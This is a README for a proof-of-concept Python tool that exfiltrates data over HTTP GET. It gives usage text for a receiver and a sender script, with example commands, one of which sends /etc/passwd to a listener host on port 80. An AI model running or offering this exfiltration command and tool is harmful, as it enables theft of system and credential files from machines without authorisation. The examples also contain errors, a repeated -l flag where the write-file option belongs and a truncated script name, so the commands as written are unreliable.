# My-HTTP-Exfiltrator
POC Python implementation Data Exfiltration using HTTP GET

This uses Python 3. To install the requirements:
```
pip install -r requirements.txt
````

## Setup Receiver
````
usage: http-get-server.py [-h] -w WRITE_FILE -l LISTENER_ADDRESS -p PORT

options:
  -h, --help            show this help message and exit
  -w WRITE_FILE, --write-file WRITE_FILE
                        File to write the HTTP Get.
  -l LISTENER_ADDRESS, --listener_address LISTENER_ADDRESS
                        Listener Address.
  -p PORT, --port PORT  Listener Port.
````

Example:
````
sudo http-get-server.py -l dump.txt -l 192.168.200.120 -p 80
````

## Setup Sender
````
sudo python http-get-transfer.py --help
usage: http-get-transfer.py [-h] -f READ_FILE -t TARGET -p PORT

options:
  -h, --help            show this help message and exit
  -f READ_FILE, --read-file READ_FILE
                        File to send by HTTP Get.
  -t TARGET, --target-address TARGET
                        Destination Address.
  -p PORT, --target-port PORT
                        Destination Port.

````

Example:
````
sudo python http-get-transfer.p -f /etc/passwd -t 192.168.200.120 -p 80
````